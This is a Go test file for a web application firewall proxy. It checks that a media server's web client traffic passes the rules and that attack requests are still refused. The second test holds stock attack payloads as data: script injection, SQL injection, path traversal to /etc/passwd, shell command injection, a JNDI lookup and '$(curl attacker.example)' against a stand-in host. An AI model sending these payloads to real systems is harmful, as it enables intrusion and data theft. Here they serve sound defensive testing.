package services

import (
	"context"
	"fmt"
	"math/rand/v2"
	"net"
	"net/http"
	"net/url"
	"strings"
	"testing"
	"time"

	"ostiole/internal/model"
)

// cv makes what Cavu's web client sends, from a seed, with the shapes a
// server in use and the client's source showed. Names, titles, paths and
// ids are made up.
type cv struct{ td }

// cvRequest is one request to a Cavu site. A beacon's body goes as
// text/plain, as sendBeacon sends a string.
type cvRequest struct {
	method, path, body, contentType string
	header                          map[string]string
}

func cvGet(path string) cvRequest         { return cvRequest{method: "GET", path: path} }
func cvBody(m, p string, b any) cvRequest { return cvRequest{method: m, path: p, body: vwJSON(b)} }
func cvBeacon(p string, b any) cvRequest {
	return cvRequest{method: "POST", path: p, body: vwJSON(b), contentType: "text/plain;charset=UTF-8"}
}
func cvRange(path string) cvRequest {
	return cvRequest{method: "GET", path: path, header: map[string]string{"Range": "bytes=0-"}}
}

// cvTitles are what a film, a show, an album or an artist is called, and
// what people search for, in the shapes that trip the rules.
var cvTitles = []string{"The Lantern Keeper", "Night Ferry (2006)", "Kill the Lights", "Who's Watching?", "Echo & the Tide",
	"Sleep No More: Part 2", "100% Juice", "Unter den Linden", "夏の雨", "山の音楽隊", "MOON SIGNAL", "Paper Kites", "Watch Hill",
	"the harbo", "river ki", "Tide Line 2004", "Small Hours", "ECHO 3", "Notes On A Quiet Summer"}

// cvDevices are what the client calls a device, as it names one and as a
// person renames it.
var cvDevices = []string{"Firefox on Linux", "Edge on Linux", "Chrome on Windows", "iPhone (Home Screen)", "iPhone (Home Screen) 3",
	"iPad", "Cavu on Android", "Sam's laptop"}

// cvPaths are a library's folders on the server.
var cvPaths = []string{"/media/Films", "/media/TV Shows", "/srv/media/cartoons", "/srv/media/Music/Echo & the Tide",
	"/media/Films/Night Ferry (2006)", "/srv/アニメ", "/"}

// cvLogLines are what the client logs in development: its own notes,
// errors and stack traces.
var cvLogLines = []string{
	"player: play() rejected: NotAllowedError: play() failed because the user didn't interact with the document first.",
	"TypeError: Cannot read properties of undefined (reading 'trackId')\n    at Object.report (connect-B7xQ2aLk.js:1:2345)",
	"connect: state seq=14 epoch=k3j9.2 index=1 positionMs=184725 playing=true",
	"queue: put rev=15 (2 items moved), select * from the cache missed",
	"hls: fragLoadError on level 2 -- retrying in 1000 ms; buffer 0.0-12.4",
	"mse: SourceBuffer.appendBuffer failed: QuotaExceededError (buffer full); evicting 30 s",
	"engine: gain -6.5 dB for track 01a19920-29a9-75c5-8d8b-d55e51a74318 (album mode)",
	"[sync] position beacon queued: {\"index\":1,\"positionMs\":31275}",
}

// cvTemplates are what a library's files are named by: Cavu's own layouts
// and ones an admin writes.
var cvTemplates = []string{
	"{title}[ ({year})]/{title}[ ({year})][ {editiontag}][ - {version}][ - pt{part}]{ext}",
	"{title}[ ({year})][ {idtag}]/{title}[ ({year})][ {idtag}][ {editiontag}][ - {version}][ - pt{part}]{ext}",
	"{show}[ ({year})][ {idtag}]/{episodes}[ {title}][ - pt{part}]{ext}",
	"{albumartist}/{album}[ ({year})]/[{discfolder}/]{track:02} - {title}{ext}",
	"{albumartist}/[{year} - ]{album}/[{disc}-]{track:02} {title}{ext}",
	"Films/{title} ({year})/{title}{ext}",
	"{show}/Season {season:02}/{show} - S{season:02}E{episode:02}{ext}",
}

// cvProfiles are the codec profiles a browser says it plays.
var cvProfiles = [][]string{{"constrained baseline", "main", "high"}, {"main", "main 10"}, {"high 10", "high"}, {"profile 0", "profile 2"}}

func (g cv) title() string  { return g.pick(cvTitles...) }
func (g cv) device() string { return g.pick(cvDevices...) }

// clientID is a tab's id, a random UUID.
func (g cv) clientID() string {
	b := g.bytes(16)
	b[6], b[8] = b[6]&0x0f|0x40, b[8]&0x3f|0x80
	return fmt.Sprintf("%x-%x-%x-%x-%x", b[0:4], b[4:6], b[6:8], b[8:10], b[10:16])
}

// asset is a script or a style as Vite names one.
func (g cv) asset() string {
	return "/assets/" + g.pick("AdminLayout", "index", "MusicHome", "PlayerBar", "connect") + "-" + g.b64url(6) + g.pick(".js", ".css")
}

func (g cv) report(device, client string) map[string]any {
	return map[string]any{"deviceId": device, "clientId": client, "epoch": "k3j9." + fmt.Sprint(1+g.r.IntN(9)), "seq": g.r.IntN(400),
		"trackId": g.id(), "index": g.r.IntN(30), "positionMs": g.r.IntN(900000), "durationMs": 25225253, "playing": true,
		"buffering": false, "volume": 0.8, "muted": false, "shuffle": false, "repeat": g.pick("off", "all", "one"), "queueRev": g.r.IntN(20),
		"privateMs": 0, "reason": g.pick("", "unplayable", "ended"), "message": g.pick("", "This track could not be played.")}
}

// requests is a session's worth: browsing, music with its beacons, a film,
// and an admin's work on the libraries.
func (g cv) requests() []cvRequest {
	const api = "/api/v1"
	lib, item, file, session, device, client := g.id(), g.id(), g.id(), g.id(), g.id(), g.clientID()
	tracks := []string{g.id(), g.id(), g.id()}
	return []cvRequest{
		cvGet(api + "/images/" + g.id() + "?" + url.Values{"w": {g.pick("160", "320", "640")}, "v": {g.b64url(6)}}.Encode()),
		cvGet(api + "/libraries/" + lib + "/items?" + url.Values{"after": {g.id()}, "limit": {"60"}, "sort": {"title"}}.Encode()),
		cvGet(api + "/items/" + item + "/children?" + url.Values{"after": {g.id()}}.Encode()),
		cvGet(api + "/events?device=" + device),
		cvGet(api + "/music/connect?device=" + device),
		cvGet(api + "/music/home?library=" + lib),
		cvGet("/music?library=" + lib),
		cvGet(api + "/music/stats/top?" + url.Values{"period": {"month"}, "kind": {"artist"}}.Encode()),
		cvGet(api + "/music/history?limit=50"),
		cvGet(api + "/items/" + item + "/next?file=" + file),
		cvGet(api + "/admin/organize/runs?library=" + lib),
		cvGet(api + "/search?" + url.Values{"q": {g.title()}}.Encode()),
		cvBody("POST", api+"/wanted/search", map[string]any{"kind": g.pick("movie", "show"), "query": g.title()}),
		cvBody("POST", api+"/wanted/search", map[string]any{"kind": "movie", "query": g.title(), "year": 2006}),
		cvBody("POST", api+"/wanted", map[string]any{"kind": "show", "libraryId": lib, "provider": "tmdb", "id": "12345"}),
		cvGet(api + "/admin/browse?" + url.Values{"path": {g.pick(cvPaths...)}}.Encode()),
		cvGet(g.asset()),
		cvRange(api + "/stream/" + g.token() + "/t-" + g.id() + "-orig." + g.pick("flac", "mp3")),
		cvRange(api + "/files/" + file + "/subtitles/e" + fmt.Sprint(2+g.r.IntN(3)) + "/pgs"),
		{method: "DELETE", path: api + "/music/connect/devices/" + device},
		{method: "DELETE", path: api + "/items/" + item + "/played"},
		{method: "DELETE", path: api + "/items/" + item + "/resume"},
		{method: "DELETE", path: api + "/admin/libraries/" + lib},
		{method: "PUT", path: api + "/items/" + item + "/played"},
		{method: "PUT", path: api + "/items/" + item + "/favorite"},
		cvBody("PATCH", api+"/admin/libraries/"+lib, map[string]any{"name": g.pick("Films", "TV Shows"), "position": 2}),
		cvBody("POST", api+"/music/connect/hello", map[string]any{"deviceId": device, "name": g.device(), "kind": "desktop", "platform": "linux",
			"standalone": false}),
		cvBeacon(api+"/music/connect/tab", map[string]any{"deviceId": device, "clientId": client, "canStart": false, "visible": false,
			"focused": false, "gone": true}),
		cvBody("POST", api+"/music/connect/tab", map[string]any{"deviceId": device, "clientId": client, "canStart": true, "visible": true,
			"focused": true}),
		cvBeacon(api+"/music/connect/state", g.report(device, client)),
		cvBody("POST", api+"/music/connect/state", g.report(device, client)),
		cvBeacon(api+"/music/queue/position", map[string]any{"clientId": client, "rev": 15, "index": 1, "positionMs": 184725}),
		cvBody("POST", api+"/music/queue/position", map[string]any{"clientId": client, "rev": 2, "index": 0, "positionMs": 31275}),
		cvBeacon(api+"/music/sessions/"+session+"/events", map[string]any{"events": []any{
			map[string]any{"eid": g.clientID(), "type": "end", "trackId": tracks[0], "at": 1793570912000, "listenedMs": 183000,
				"reason": "completed", "context": map[string]any{"kind": "album", "id": g.id()}}}}),
		cvBody("POST", api+"/music/sessions/"+session+"/events", map[string]any{"events": []any{
			map[string]any{"eid": g.clientID(), "type": "start", "trackId": tracks[1], "at": 1793570913000, "context": map[string]any{"kind": "artist", "id": nil}}}}),
		cvBeacon(api+"/music/sessions/"+session+"/stop", map[string]any{"positionMs": 99369}),
		cvBody("POST", api+"/music/sessions/"+session+"/progress", map[string]any{"trackId": tracks[0], "positionMs": 3818, "state": "playing",
			"private": false}),
		cvBody("POST", api+"/music/sessions/"+session+"/prepare", map[string]any{"tracks": []any{map[string]any{"id": tracks[0], "priority": "now"},
			map[string]any{"id": tracks[1], "priority": "ahead"}}, "quality": "original", "qualityAway": "medium"}),
		cvBody("POST", api+"/music/sessions", map[string]any{"profile": map[string]any{"engine": "mse", "forms": []string{"fmp4", "flac"},
			"native": []string{"mp3", "aac"}}, "quality": "high", "qualityAway": "low", "private": false, "replace": session, "handoff": g.id(),
			"clientId": client}),
		cvBody("POST", api+"/music/tracks/batch", map[string]any{"ids": tracks}),
		cvBody("POST", api+"/music/expand", map[string]any{"source": map[string]any{"kind": "album", "id": g.id()}, "shuffle": true,
			"startId": tracks[0]}),
		cvBody("POST", api+"/music/mixes", map[string]any{"seed": map[string]any{"kind": "track", "id": tracks[2]}, "n": 50, "exclude": tracks}),
		cvBody("PUT", api+"/music/queue", map[string]any{"clientId": client, "device": g.device(), "rev": 4, "queue": map[string]any{
			"items": tracks, "history": []string{g.id()}, "index": 1, "context": map[string]any{"kind": "album", "id": g.id(), "title": g.title()},
			"mix": map[string]any{"mixId": g.id(), "seed": map[string]any{"kind": "track", "id": tracks[0]}}}}),
		cvBody("POST", api+"/music/connect/transfer", map[string]any{"id": g.id(), "from": device, "clientId": client, "to": g.id(), "play": true}),
		cvBody("PUT", api+"/me/music-prefs", map[string]any{"crossfadeMs": 4000, "gain": "album", "gapless": true}),
		cvBody("PUT", api+"/me/playback", map[string]any{"quality": "auto", "subtitles": "forced", "startedPercent": 5, "watchedPercent": 90}),
		cvBody("POST", api+"/playback/sessions", map[string]any{"itemId": item, "fileId": file, "audioIndex": 1, "startMs": 0, "quality": "auto",
			"replace": g.id(), "profile": map[string]any{"hls": map[string]any{"native": false, "mse": true}, "maxHeight": 2160,
				"maxBitrate": 40000000, "audioMode": "muxed", "subtitles": map[string]any{"ass": true, "pgs": true},
				"video": []any{map[string]any{"codec": "h264", "profiles": cvProfiles[g.r.IntN(len(cvProfiles))], "maxLevel": 51},
					map[string]any{"codec": "av1", "profiles": []string{"main"}}}}}),
		cvBody("POST", api+"/admin/items/"+item+"/identify", map[string]any{"provider": "tmdb", "id": "12345"}),
		cvBody("POST", api+"/admin/items/"+item+"/identify", map[string]any{"provider": "tvdb", "id": g.id()}),
		cvBody("POST", api+"/admin/items/"+item+"/identify/search", map[string]any{"q": g.title(), "year": 2006, "provider": "tmdb"}),
		cvBody("POST", api+"/admin/music/albums/"+g.id()+"/identify/search", map[string]any{"album": g.title(), "artist": g.title(), "year": 1982}),
		cvBody("PUT", api+"/admin/music/albums/"+g.id()+"/identify", map[string]any{"mbid": g.clientID()}),
		cvBody("PUT", api+"/admin/music/albums/"+g.id()+"/cover", map[string]any{"id": g.id()}),
		cvBody("POST", api+"/admin/libraries", map[string]any{"name": g.pick("Films", "TV Shows", "Music"), "kind": "movies",
			"paths": []string{g.pick(cvPaths...), g.pick(cvPaths...)}, "restricted": true, "userIds": []string{g.id()}}),
		cvBody("PUT", api+"/admin/libraries/"+lib+"/access", map[string]any{"restricted": true, "userIds": []string{g.id(), g.id()}}),
		cvBody("PUT", api+"/admin/libraries/"+lib+"/organize/settings", map[string]any{"enabled": true, "preset": "custom",
			"template": cvTemplates[0], "maxFiles": 500, "opsPerSec": 20, "safeNames": true}),
		cvBody("POST", api+"/admin/libraries/"+lib+"/organize/layout/validate", map[string]any{"preset": "custom",
			"template": cvTemplates[1], "safeNames": true}),
		cvBody("PUT", api+"/me/home", map[string]any{"rows": []any{map[string]any{"key": "continue", "hidden": false},
			map[string]any{"key": "nextup", "hidden": true}, map[string]any{"key": "recent:" + lib, "hidden": false},
			map[string]any{"key": "recent:" + item, "hidden": false}}}),
		cvBody("PUT", api+"/admin/home", map[string]any{"rows": []any{map[string]any{"key": "recent:" + lib, "hidden": false},
			map[string]any{"key": "continue", "hidden": false}}}),
		cvBody("POST", api+"/admin/libraries/"+lib+"/organize/plans", map[string]any{"source": "findings", "findings": []string{g.id()},
			"tagEdits": []any{map[string]any{"file": g.id(), "disc": 1, "track": 3, "year": "1982", "discTotal": 2, "compilation": false}}}),
		cvBody("POST", api+"/admin/libraries/"+lib+"/organize/actions", map[string]any{"finding": g.id(), "files": []string{g.id()},
			"keeper": g.id(), "action": "keep"}),
		cvBody("PUT", api+"/admin/users/"+g.id()+"/policy", map[string]any{"canDownload": true, "maxStreams": 2, "transcode": "allow"}),
		cvBody("PUT", api+"/admin/providers/"+g.pick("tvdb", "tmdb", "fanart", "acoustid"), map[string]any{"enabled": true,
			"key": g.pick(g.b64url(24), fmt.Sprintf("%x", g.bytes(16)), `p@ss'w0rd"; --`)}),
		cvBody("PUT", api+"/admin/providers/opensubtitles", map[string]any{"enabled": true, "username": "sam", "password": `<Tr0ub4dor&3>`}),
		cvBody("POST", api+"/auth/login", map[string]any{"username": "sam", "password": `correct horse; battery's "staple"`}),
		cvBody("POST", api+"/auth/setup", map[string]any{"setupCode": "482913", "username": "admin", "password": "x' OR 1=1 -- long enough"}),
		cvBody("POST", api+"/auth/step-up", map[string]any{"password": "<Tr0ub4dor&3>"}),
		cvBody("POST", api+"/reset/"+g.token(), map[string]any{"password": "p@ss w0rd (new)"}),
		cvBody("POST", api+"/me/password", map[string]any{"currentPassword": "p@ss w0rd (old)", "newPassword": "a;b|c`d$(e)"}),
		cvBody("POST", api+"/invites/"+g.token()+"/accept", map[string]any{"username": "jo", "password": "jo's & sam's"}),
		cvBody("POST", api+"/auth/passkey/finish", map[string]any{"credential": g.credential(false)}),
		cvBody("POST", api+"/auth/step-up/passkey/finish", map[string]any{"credential": g.credential(false)}),
		cvBody("POST", api+"/me/mfa/passkeys/finish", map[string]any{"credential": g.credential(true), "name": "Phone"}),
		cvBody("POST", api+"/dev/client-log", map[string]any{"page": "/music/album/" + g.id(), "entries": []any{
			map[string]any{"t": 12.5, "level": "error", "src": "player", "msg": g.pick(cvLogLines...)},
			map[string]any{"t": 13.1, "level": "debug", "src": "connect", "msg": g.pick(cvLogLines...)}}}),
	}
}

func cvSend(t *testing.T, addr string, r cvRequest) int {
	t.Helper()
	contentType := r.contentType
	if contentType == "" && r.body != "" {
		contentType = "application/json"
	}
	tr := &http.Transport{DialContext: func(ctx context.Context, network, _ string) (net.Conn, error) {
		var d net.Dialer
		return d.DialContext(ctx, network, addr)
	}}
	defer tr.CloseIdleConnections()
	req, err := http.NewRequestWithContext(t.Context(), r.method, "http://media.example.com"+r.path, strings.NewReader(r.body))
	if err != nil {
		t.Fatal(err)
	}
	if contentType != "" {
		req.Header.Set("Content-Type", contentType)
	}
	req.Header.Set("Accept", "*/*")
	req.Header.Set("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 Edg/142.0.0.0")
	req.Header.Set("Cookie", "cavu_session="+base64URL32)
	for k, v := range r.header {
		req.Header.Set(k, v)
	}
	resp, err := (&http.Client{Transport: tr, Timeout: time.Minute}).Do(req)
	if err != nil {
		t.Fatalf("%s %s: %v", r.method, r.path, err)
	}
	_ = resp.Body.Close()
	return resp.StatusCode
}

// base64URL32 is a session token whose base64url spells nothing.
const base64URL32 = "Zq3vH8pLmN2xR7tYwK5cB9dF4gJ6sA1eQ0uIoPzXyWv"

// cavuSite runs the sidecar with one Cavu site at paranoia pl, blocking,
// with the set loaded or not.
func cavuSite(t *testing.T, pl int, set bool) (string, *lockedBuffer) {
	t.Helper()
	profile := model.WAFProfile{ID: "media", Mode: "block", Paranoia: pl}
	if set {
		profile.Applications = []string{"cavu"}
	}
	cfg := &model.Config{}
	cfg.Services.Proxy = model.Proxy{
		Enabled: true, HTTPPort: freePort(t), HTTPSPort: freePort(t),
		Pools:    []model.ProxyPool{{ID: "cavu", Upstreams: []model.ProxyUpstream{{Address: answer(t, "{}")}}}},
		Profiles: []model.WAFProfile{profile},
		Sites: []model.ProxySite{{ID: "media", Enabled: true, Hosts: []string{"media.example.com"}, Pool: "cavu",
			PlainHTTP: true, WAF: "media"}},
	}
	plain, _, out := runSidecar(t, sidecar(t), cfg, "", map[string][]string{model.SelfCertificate: {"127.0.0.1"}})
	return plain, out
}

// What Cavu's web client sends passes at every paranoia level with the set
// loaded, where at paranoia 4 without it most requests are refused.
func TestTheCavuSetLetsItsClientThrough(t *testing.T) {
	t.Parallel()
	for pl := 1; pl <= 4; pl++ {
		t.Run(fmt.Sprintf("paranoia %d", pl), func(t *testing.T) {
			t.Parallel()
			plain, out := cavuSite(t, pl, true)
			g := cv{td{vw{rand.New(rand.NewPCG(uint64(pl), 23))}}}
			send := func(r cvRequest, what string) {
				if status := cvSend(t, plain, r); status != http.StatusOK {
					t.Errorf("%s %s %.100q%s: %d", r.method, r.path, r.body, what, status)
				}
			}
			for _, title := range cvTitles {
				send(cvGet("/api/v1/search?"+url.Values{"q": {title}}.Encode()), "")
				send(cvBody("POST", "/api/v1/wanted/search", map[string]any{"kind": "movie", "query": title}), "")
				send(cvBody("POST", "/api/v1/admin/items/"+g.id()+"/identify/search", map[string]any{"q": title, "provider": "tmdb"}), "")
				send(cvBody("POST", "/api/v1/admin/music/albums/"+g.id()+"/identify/search", map[string]any{"album": title, "artist": title}), "")
				send(cvBody("PUT", "/api/v1/music/queue", map[string]any{"clientId": g.clientID(), "device": "iPad", "queue": map[string]any{
					"items": []string{g.id()}, "index": 0, "context": map[string]any{"kind": "playlist", "id": g.id(), "title": title}}}), "")
			}
			for _, name := range cvDevices {
				send(cvBody("POST", "/api/v1/music/connect/hello", map[string]any{"deviceId": g.id(), "name": name, "kind": "phone",
					"platform": "ios", "standalone": true}), "")
			}
			for _, path := range cvPaths {
				send(cvGet("/api/v1/admin/browse?"+url.Values{"path": {path}}.Encode()), "")
				send(cvBody("POST", "/api/v1/admin/libraries", map[string]any{"name": "Films", "kind": "movies", "paths": []string{path}}), "")
			}
			for _, line := range cvLogLines {
				send(cvBody("POST", "/api/v1/dev/client-log", map[string]any{"page": "/", "entries": []any{
					map[string]any{"t": 1.5, "level": "warn", "src": "player", "msg": line}}}), "")
			}
			for _, profiles := range cvProfiles {
				send(cvBody("POST", "/api/v1/playback/sessions", map[string]any{"itemId": g.id(), "profile": map[string]any{
					"video": []any{map[string]any{"codec": "hevc", "profiles": profiles}}}}), "")
			}
			for range 3 {
				for _, r := range g.requests() {
					send(r, "")
				}
			}
			// A picture's width and version, a script's name and a passkey
			// are random, so many of each.
			for range 40 {
				send(cvGet("/api/v1/images/"+g.id()+"?w=320&v="+g.b64url(6)), " (a picture)")
				send(cvGet(g.asset()), " (a script)")
				send(cvGet("/assets/AdminLayout-DNf-AqVU.js"), " (a script)")
				send(cvBody("POST", "/api/v1/auth/passkey/finish", map[string]any{"credential": g.credential(false)}), " (a passkey)")
			}
			// Answers whose base64url spells SQL, a comment, a hex number or
			// a command, as one in five hundred does.
			for _, sig := range []string{"MEUCIQD--x7fLr2kQp_wd9uQzN8aB3cE", "MEQCIF0x9eciysImNJe75pvImDf0hhYXbBZ", "MEUCIG4u_union-select_Ap3r9Xc",
				"MEYCIQC-wget_kf8Lz0Ra3Tq9vB2nYxW"} {
				c := g.credential(false)
				c["response"].(map[string]any)["signature"] = sig
				send(cvBody("POST", "/api/v1/auth/step-up/passkey/finish", map[string]any{"credential": c}), " (a passkey)")
			}
			h := cv{td{vw{rand.New(rand.NewPCG(uint64(pl), 1100))}}}
			for _, tpl := range cvTemplates {
				lib := h.id()
				send(cvBody("POST", "/api/v1/admin/libraries/"+lib+"/organize/layout/validate", map[string]any{"preset": "custom",
					"template": tpl, "safeNames": false}), "")
				send(cvBody("PUT", "/api/v1/admin/libraries/"+lib+"/organize/settings", map[string]any{"enabled": true,
					"preset": "custom", "template": tpl, "maxFiles": 2000, "opsPerSec": 50, "safeNames": true}), "")
			}
			// A player's 404 reads as SQL to libinjection, whatever the stream.
			send(cvBody("POST", "/api/v1/dev/client-log", map[string]any{"page": "/watch/" + h.id(), "entries": []any{
				map[string]any{"t": 3.2, "level": "warn", "src": "hls", "msg": "404 while loading https://media.example.com/api/v1/stream/" +
					h.token() + "/51.m4s"}}}), "")
			if t.Failed() {
				t.Logf("events:\n%s", events(out))
			}
		})
	}
}

// cvAttack is an attack on a Cavu site, and from the lowest paranoia level
// CRS alone refuses it at. Text is sent to CRS alone at paranoia 1.
type cvAttack struct {
	from int
	r    cvRequest
}

// An attack CRS alone refuses at a level is refused with the set loaded
// too: in an argument the client fills with ids, numbers and words, in a
// beacon, in a codec's profiles, in a password or a key sent where none
// goes, and in names and paths the set lets through only in their own
// places. Text, the client's log and a template for files' names too,
// keeps what CRS alone refuses at paranoia 1, less the one check each of
// those two skips.
func TestTheCavuSetKeepsTheAttacks(t *testing.T) {
	t.Parallel()
	g := cv{td{vw{rand.New(rand.NewPCG(7, 23))}}}
	const api = "/api/v1"
	item, session, client := g.id(), g.id(), g.clientID()
	inText := []cvAttack{
		{1, cvGet(api + "/search?" + url.Values{"q": {"<script>alert(1)</script>"}}.Encode())},
		{1, cvBody("POST", api+"/admin/items/"+item+"/identify/search", map[string]any{"q": "x' UNION SELECT password FROM users--"})},
		{1, cvGet(api + "/admin/browse?" + url.Values{"path": {"/media/../../etc/passwd"}}.Encode())},
		{1, cvBody("POST", api+"/admin/libraries", map[string]any{"name": "Films", "paths": []string{"/media; cat /etc/passwd"}})},
		{1, cvBody("POST", api+"/music/connect/hello", map[string]any{"name": "<img src=x onerror=alert(1)>", "kind": "phone"})},
		{1, cvBody("PUT", api+"/music/queue", map[string]any{"device": "${jndi:ldap://attacker.example/a}", "queue": map[string]any{}})},
		{1, cvBody("POST", api+"/admin/music/albums/"+item+"/identify/search", map[string]any{"album": "x", "artist": "Sam; ls -la"})},
		{1, cvGet(api + "/search?" + url.Values{"q": {"${jndi:ldap://attacker.example/a}"}}.Encode())},
		{1, cvBody("POST", api+"/wanted/search", map[string]any{"kind": "movie", "query": "x' UNION SELECT password FROM users--"})},
		{1, cvBody("POST", api+"/wanted/search", map[string]any{"kind": "show", "query": "<script>alert(1)</script>"})},
		{1, cvBody("POST", api+"/dev/client-log", map[string]any{"entries": []any{map[string]any{"msg": "<script>alert(document.cookie)</script>"}}})},
		{1, cvBody("POST", api+"/dev/client-log", map[string]any{"entries": []any{map[string]any{"msg": "x' UNION SELECT password FROM users--"}}})},
		{1, cvBody("POST", api+"/dev/client-log", map[string]any{"entries": []any{map[string]any{"msg": "done; cat /etc/passwd"}}})},
		{1, cvBody("POST", api+"/admin/libraries/"+item+"/organize/layout/validate", map[string]any{"template": "{title}/../../../etc/passwd"})},
		{1, cvBody("POST", api+"/admin/libraries/"+item+"/organize/layout/validate", map[string]any{"template": "{title}{ext}; cat /etc/passwd"})},
		{1, cvBody("POST", api+"/admin/libraries/"+item+"/organize/layout/validate", map[string]any{"template": "{title}$(curl attacker.example){ext}"})},
	}
	attacks := []cvAttack{
		// Without a character only the rules that count them see. Where
		// the client sends ids, numbers and words these are marked, and
		// read as CRS reads them.
		{4, cvGet(api + "/libraries/" + g.id() + "/items?after=a);(b")},
		{4, cvBody("POST", api+"/music/tracks/batch", map[string]any{"ids": []string{g.id(), "a);(b"}})},
		{1, cvBody("POST", api+"/music/tracks/batch", map[string]any{"ids": []string{"1' OR '1'='1"}})},
		{1, cvBody("POST", api+"/playback/sessions", map[string]any{"itemId": "<img src=x onerror=alert(1)>"})},
		{4, cvBody("POST", api+"/music/connect/state", map[string]any{"clientId": client, "epoch": "a);(b"})},
		// A beacon is read as JSON, and a body that is not JSON is
		// refused.
		{1, cvBeacon(api+"/music/queue/position", map[string]any{"clientId": "1' OR '1'='1", "index": 1})},
		{1, cvBeacon(api+"/music/sessions/"+session+"/stop", map[string]any{"positionMs": "$(curl attacker.example)"})},
		{1, cvBeacon(api+"/music/connect/tab", map[string]any{"deviceId": "<script>alert(1)</script>"})},
		{1, cvRequest{method: "POST", path: api + "/music/queue/position", body: "x' UNION SELECT password FROM users--",
			contentType: "text/plain;charset=UTF-8"}},
		{1, cvRequest{method: "POST", path: api + "/items/" + item + "/played", body: vwJSON(map[string]any{"a": 1}),
			contentType: "text/plain;charset=UTF-8"}},
		// A codec's profiles are lower case words.
		{4, cvBody("POST", api+"/playback/sessions", map[string]any{"itemId": item, "profile": map[string]any{
			"video": []any{map[string]any{"codec": "h264", "profiles": []string{"a);(b"}}}}})},
		{1, cvBody("POST", api+"/playback/sessions", map[string]any{"itemId": item, "profile": map[string]any{
			"video": []any{map[string]any{"codec": "h264", "profiles": []string{"x' UNION SELECT password FROM users--"}}}}})},
		// Only the name id is not taken for the command, and only on a
		// picture the name w.
		{3, cvBody("POST", api+"/admin/items/"+item+"/identify", map[string]any{"provider": "tmdb", "ls": 1})},
		{3, cvGet(api + "/items/" + item + "?w=320")},
		// The paths that end in commands' names are those two alone, and
		// a script's name is Vite's.
		{3, cvGet(api + "/music/top")},
		{3, cvGet("/assets/x-dnf.js")},
		{3, cvGet("/assets/AdminLayout-DNf-AqVU.map")},
		// A password and a key are unread only where one goes.
		{1, cvBody("POST", api+"/music/connect/hello", map[string]any{"name": "x", "password": "x' UNION SELECT password FROM users--"})},
		{1, cvBody("POST", api+"/items/"+item+"/played", map[string]any{"key": "x' UNION SELECT password FROM users--"})},
		{1, cvBody("POST", api+"/auth/login", map[string]any{"username": "x' UNION SELECT password FROM users--", "password": "x"})},
		// A home row's key is one of three.
		{4, cvBody("POST", api+"/me/home", map[string]any{"rows": []any{map[string]any{"key": "a);(b", "hidden": false}}})},
		{1, cvBody("POST", api+"/me/home", map[string]any{"rows": []any{map[string]any{"key": "x' UNION SELECT password FROM users--"}}})},
		// A passkey's answer is base64url.
		{1, cvBody("POST", api+"/auth/passkey/finish", map[string]any{"credential": map[string]any{"id": "x", "response": map[string]any{
			"signature": "x' OR 1=1--"}}})},
		// Range is taken where players seek.
		{3, cvRange(api + "/items/" + item)},
		// PUT, PATCH and DELETE are the API's alone.
		{1, cvRequest{method: "PUT", path: "/music"}},
	}
	for pl := 1; pl <= 4; pl++ {
		t.Run(fmt.Sprintf("paranoia %d", pl), func(t *testing.T) {
			t.Parallel()
			bare, _ := cavuSite(t, pl, false)
			bareText := bare
			if pl > 1 {
				bareText, _ = cavuSite(t, 1, false)
			}
			plain, out := cavuSite(t, pl, true)
			check := func(name, bare string, level int, as []cvAttack) {
				for i, a := range as {
					r := a.r
					checkAttack(t, pl, level, a.from, fmt.Sprintf("%s[%d] %s %s %.100q", name, i, r.method, r.path, r.body),
						func(set bool) bool {
							if set {
								return cvSend(t, plain, r) == http.StatusForbidden
							}
							return cvSend(t, bare, r) == http.StatusForbidden
						})
				}
			}
			check("attacks", bare, pl, attacks)
			check("inText", bareText, 1, inText)
			if t.Failed() {
				t.Logf("events:\n%s", events(out))
			}
		})
	}
}
